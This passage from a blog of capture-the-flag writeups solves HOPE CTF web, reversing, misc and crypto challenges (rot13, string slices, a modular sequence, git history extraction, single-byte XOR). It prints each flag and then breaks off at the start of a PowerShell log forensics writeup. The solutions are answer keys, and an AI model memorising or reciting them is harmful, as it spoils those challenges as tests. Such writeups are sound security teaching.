class="code"><pre><span class="line">Just your average sanity check!</span><br></pre></td></tr></table></figure><p>We got this webpage </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F48673dd6-0d8f-459c-a309-2e2d715299bd%2FUntitled.png?id=44d99a96-1578-45a5-abe8-04aa63671b64&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web2"></p><p>seems like it is a password checker. Let’s try to inspect the page</p><p>Oh! we got this message</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F14d17539-8897-4eca-b692-e46d217b19d4%2FUntitled.png?id=b105ffd7-7f47-4169-bb86-8086c0052330&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web2"></p><p>Then what about the page source . Looks like we can read it but some people said they couldn’t even right click to view the source code ( is that something related to the chrome version ? idk ). Anyways , when we read through the page source we notice this code right here</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> scripts = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  scripts.<span class="title function_">forEach</span>(<span class="function">(<span class="params">script</span>) =&gt;</span> script.<span class="title function_">remove</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">chr</span> = (<span class="params">c</span>) =&gt; c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">  form.<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    event.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[type=&quot;text&quot;]&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> output = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> char <span class="keyword">of</span> input.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">map</span>(chr)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">chr</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= char &amp;&amp; char &lt;= <span class="title function_">chr</span>(<span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">        output.<span class="title function_">push</span>(<span class="title function_">chr</span>(<span class="string">&#x27;a&#x27;</span>) + ((char - <span class="title function_">chr</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">chr</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= char &amp;&amp; char &lt;= <span class="title function_">chr</span>(<span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">        output.<span class="title function_">push</span>(<span class="title function_">chr</span>(<span class="string">&#x27;A&#x27;</span>) + ((char - <span class="title function_">chr</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        output.<span class="title function_">push</span>(char);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> target = <span class="string">&#x27;ubcr&#123;pyvrag_fvqr_pyvpur&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (output.<span class="title function_">map</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>) === target) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.content&#x27;</span>).<span class="property">textContent</span> = <span class="string">&#x27;Correct!&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      input.<span class="title function_">removeAttribute</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">      input.<span class="property">offsetWidth</span>;</span><br><span class="line">      input.<span class="property">style</span>.<span class="property">animation</span> = <span class="string">&#x27;shake 0.25s&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>And what we are interested in is this line right here</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> target = <span class="string">&#x27;ubcr&#123;pyvrag_fvqr_pyvpur&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>looks like it is a flag but it is rotated somehow. I threw it to CyberChef then tried <code>rot13</code> and it worked!</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9e89cbb7-c99b-45e3-ad4e-bf33a057db68%2FUntitled.png?id=2cdacf58-227a-4324-84e6-7161589f9606&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web2"></p><p>Now if we submit it in the password field and hit check we get the <code>Correct!</code> message </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0e9055b6-31b8-4c28-b53a-7f157f9a485c%2FUntitled.png?id=b9584b43-e7ee-4695-a919-bae874d9d9da&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="web2"></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F28412deb-505b-4b3e-9f25-f7d0f1400a23%2FUntitled.png?id=13323723-13fd-43d2-b897-3e5f48161796&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1370&userId=&cache=v2" alt="web2"></p><p>Flag : <code>hope&#123;client_side_cliche&#125;</code></p><hr><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Slices"><a href="#Slices" class="headerlink" title="Slices"></a>Slices</h2><blockquote><p>Slices.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fail</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>: fail()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[:<span class="number">5</span>] != <span class="string">&#x27;hope&#123;&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">1</span>] != <span class="string">&#x27;&#125;&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">5</span>::<span class="number">3</span>] != <span class="string">&#x27;i0_tnl3a0&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">4</span>::<span class="number">4</span>] != <span class="string">&#x27;&#123;0p0lsl&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">3</span>::<span class="number">5</span>] != <span class="string">&#x27;e0y_3l&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">6</span>::<span class="number">3</span>] != <span class="string">&#x27;_vph_is_t&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">7</span>::<span class="number">3</span>] != <span class="string">&#x27;ley0sc_l&#125;&#x27;</span>: fail()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Congrats!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag is: &#x27;</span>, flag)</span><br></pre></td></tr></table></figure><p>I did it by hand lol</p><blockquote><p>Solution</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test : hope&#123;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag : hope&#123;i_l0ve_pyth0n_slic3s_a_l0t&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment"># i  0  _  t  n  l  3  a  0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment">#        p   0   l   s   l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment">#    0    y    _    3    l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment">#  _  v  p  h  _  i  s  _  t</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment">#   l  e  y  0  s  c  _  l</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Equivalence </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ADGJMPSVY</span></span><br><span class="line"><span class="comment"># i0_tnl3a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;DHLPTX</span></span><br><span class="line"><span class="comment"># &#123;0p0lsl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eDINSX</span></span><br><span class="line"><span class="comment"># e0y_3l</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BEHKNQTWZ</span></span><br><span class="line"><span class="comment"># _vph_is_t</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CFILORUX&#125;</span></span><br><span class="line"><span class="comment"># ley0sc_l&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### reference : https://onecompiler.com/python/3yas8dysd</span></span><br></pre></td></tr></table></figure><p>Flag : <code>hope&#123;i_l0ve_pyth0n_slic3s_a_l0t&#125;</code></p><h2 id="Sequence"><a href="#Sequence" class="headerlink" title="Sequence"></a>Sequence</h2><p>We got a binary and a server to connect to when getting things work locally.</p><p>I opened the binary in IDA and noticed this function called <code>checker</code> , it is the function that checks for our input if it is correct then the flag will be printed </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5f69fdd8-18e5-414e-a6e7-8d607f6cacf7%2FUntitled.png?id=38b96d83-1f07-42f1-9841-b5a3973e322a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=830&userId=&cache=v2" alt="rev"></p><p>our input should be in this format <code>%d %d %d %d %d %d</code> so we need to find 6 numbers that are the solutions for this challenge</p><blockquote><p>Solution</p></blockquote><p>What we are interested in is this code right here</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2[<span class="number">0</span>] != <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2[i] != (<span class="number">3</span> * v2[i - <span class="number">1</span>] + <span class="number">7</span>) % <span class="number">16</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br></pre></td></tr></table></figure><p>We have the value of <code>v2[0]</code> which is <code>12</code> so we can get the rest of the 5 values from <code>v2[1]</code> to <code>v2[5]</code> . I did this manually though </p><p>We have the general equation </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2[i] != (<span class="number">3</span> * v2[i - <span class="number">1</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br></pre></td></tr></table></figure><p>If we want to calculate the value of <code>v2[1]</code> it will be </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v2[<span class="number">1</span>] != (<span class="number">3</span> * v2[<span class="number">0</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br></pre></td></tr></table></figure><p>and so on , until we get all the values.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">v2[<span class="number">1</span>] != (<span class="number">3</span> * v2[<span class="number">0</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br><span class="line">v2[<span class="number">1</span>] =  (<span class="number">3</span> *  <span class="number">12</span>   + <span class="number">7</span>) % <span class="number">16</span> = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">2</span></span><br><span class="line">v2[<span class="number">2</span>] != (<span class="number">3</span> * v2[<span class="number">1</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br><span class="line">v2[<span class="number">2</span>]  = (<span class="number">3</span> *  <span class="number">11</span>   + <span class="number">7</span>) % <span class="number">16</span> = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">3</span></span><br><span class="line">v2[<span class="number">3</span>] != (<span class="number">3</span> * v2[<span class="number">2</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br><span class="line">v2[<span class="number">3</span>]  = (<span class="number">3</span> *  <span class="number">8</span>    + <span class="number">7</span>) % <span class="number">16</span> = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">4</span></span><br><span class="line">v2[<span class="number">4</span>] != (<span class="number">3</span> * v2[<span class="number">3</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br><span class="line">v2[<span class="number">4</span>] != (<span class="number">3</span> * <span class="number">15</span>    + <span class="number">7</span>) % <span class="number">16</span> = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">5</span></span><br><span class="line">v2[<span class="number">5</span>] != (<span class="number">3</span> * v2[<span class="number">4</span>] + <span class="number">7</span>) % <span class="number">16</span></span><br><span class="line">v2[<span class="number">5</span>] != (<span class="number">3</span> *     <span class="number">4</span> + <span class="number">7</span>) % <span class="number">16</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">sequence : <span class="number">12</span> <span class="number">11</span> <span class="number">8</span> <span class="number">15</span> <span class="number">4</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>So our final sequence is </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span> <span class="number">11</span> <span class="number">8</span> <span class="number">15</span> <span class="number">4</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>Let’s try it in the remote server. It worked! </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F83e06604-57b1-4070-9889-52b72d46ed0a%2FUntitled.png?id=c2d8010a-b7e2-46a3-a649-3fd6d4722f6b&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=630&userId=&cache=v2" alt="rev"></p><p>Flag : <code>hope&#123;definitely_solvable_with_angr&#125;</code></p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="orphan"><a href="#orphan" class="headerlink" title="orphan"></a>orphan</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a><strong>Challenge Description</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nothing to see here</span><br></pre></td></tr></table></figure><p>We got a zip file that when we extract we get the following files</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F79026c8e-a392-498c-a15d-d317ba4621f6%2FUntitled.png?id=d6343896-cb91-4fef-9844-a9671d3a217f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1450&userId=&cache=v2" alt="misc"></p><p>There is a <code>.git</code> folder and a <code>foo.txt</code> file </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd575d52d-2829-4c2e-996e-bb80a2ba1e12%2FUntitled.png?id=25216507-bfed-4c52-aba5-71a3b79215a9&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=920&userId=&cache=v2" alt="misc"></p><p>Usually when I work with <code>.git</code> folders I always use this tool <a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a> to extract the commits from the <code>.git</code> directory. For this challenge we gonna use the <code>Extractor.sh</code> script</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F88eecff2-e8f9-42ff-a35a-61b3d3891e7b%2FUntitled.png?id=03326628-a61b-49b8-a7ab-0ed153173e89&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=740&userId=&cache=v2" alt="misc"></p><p>I made a folder called extract to save the extracted files there</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0f9ea058-01b1-4368-b5d3-405ce1f4fd89%2FUntitled.png?id=52397518-b02e-4bb0-baed-0cf9db5ab523&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1880&userId=&cache=v2" alt="misc"></p><p>And right away we got a <code>flag.txt</code> file which contains our flag</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9ff4d06-5dfd-4927-bc04-1b03af77db15%2FUntitled.png?id=f9446fc0-77ad-405f-b7cc-ae0c03e6a63f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1700&userId=&cache=v2" alt="misc"></p><p>Flag : <code>hope&#123;ba9f11ecc3497d9993b933fdc2bd61e5</code></p><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="obp"><a href="#obp" class="headerlink" title="obp"></a>obp</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a><strong>Challenge Description</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The unbreakable One Byte Pad</span><br></pre></td></tr></table></figure><blockquote><p>encrypt.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    plaintext = f.read()</span><br><span class="line"></span><br><span class="line">key = random.randrange(<span class="number">256</span>)</span><br><span class="line">ciphertext = [key ^ byte <span class="keyword">for</span> byte <span class="keyword">in</span> plaintext]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><blockquote><p>output.txt</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">babda2b7a9bcbda68db38dbebda68dbdb48db9b7aba18dbfb6a2aaa7a3beb1a2bfb7b5a3a7afd8</span><br></pre></td></tr></table></figure><p>This is a typical XOR challenge</p><blockquote><p>Solve.py</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;babda2b7a9bcbda68db38dbebda68dbdb48db9b7aba18dbfb6a2aaa7a3beb1a2bfb7b5a3a7afd8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        pt = <span class="built_in">bytes</span>(b ^ k <span class="keyword">for</span> b <span class="keyword">in</span> ct)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;hope&#x27;</span> <span class="keyword">in</span> pt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Key: <span class="subst">&#123;k&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Plain text: <span class="subst">&#123;pt.decode()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0f480621-6dfb-4aee-b7b0-4a371bc2d325%2FUntitled.png?id=ab38ac7a-1beb-4e8b-894b-57ea9512a858&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=910&userId=&cache=v2" alt="crypto"></p><p>Flag : <code>hope&#123;not_a_lot_of_keys_mdpxuqlcpmegqu&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> reversing </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cyber Apocalypse CTF 2022 Writeups</title>
      <link href="/2022/05/19/Cyber-Apocalypse-CTF-2022-Writeups/"/>
      <url>/2022/05/19/Cyber-Apocalypse-CTF-2022-Writeups/</url>
      
        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Puppeteer"><a href="#Puppeteer" class="headerlink" title="Puppeteer"></a>Puppeteer</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Planet Longhir is known for it&#x27;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation&#x27;s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite&#x27;s location was leaked since it is a top-sercret that only Galactic Federation&#x27;s council is aware of. Help her analyse the Council&#x27;s HQ event logs and solve this mystery.</span><br></pre></td></tr></table></figure><p>We are given a zip file to download , when we extract it we get a folder called “Logs” which contains many files with the extension <code>.evtx</code> . </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd934bb7d-a49d-45c5-b4de-e66fdaa8dab8%2FUntitled.png?id=fa4d75a3-4023-4001-b95f-f2c632dade7d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1460&userId=&cache=v2" alt="forensics"></p><p>This challenge is similar to an old challenge in HTB called ****<code>Event Horizon</code> . </p><p>In order to view those logs I am going to open them in the <code>Event Viewer</code> for windows. The logs we are particularly interested in are the ones with the <strong>PowerShell</strong> in them</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85b6f035-bcf3-4df7-b9ef-b8257a1b1ae4%2FUntitled.png?id=b634bb80-e70c-49a3-8948-b073bdbc3609&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1370&userId=&cache=v2" alt="forensics"></p><p>If we look at the logs above we notice that the <code>Microsoft-Windows-PowerShell%4Operational.evtx</code> is the biggest one in term of size.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F92f42f32-c6c1-489b-8694-59979c2a50ef%2FUntitled.png?id=b7535548-b4e9-45f2-af47-4c186740a06d&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1380&userId=&cache=v2" alt="forensics"></p><p>I opened it and started going through the events.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F720014ad-a373-431d-9d8f-e74431071aa0%2FUntitled.png?id=27fcb65a-7d76-4db5-903d-9512e8051d24&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>After scrolling through them I noticed this event right here which contains a PowerShell script.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F80c88cae-b9ae-4d66-a065-b7d931247ac8%2FUntitled.png?id=29e9868e-7f8c-48ad-b7f3-45e7c2fec21f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>This is the whole script</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 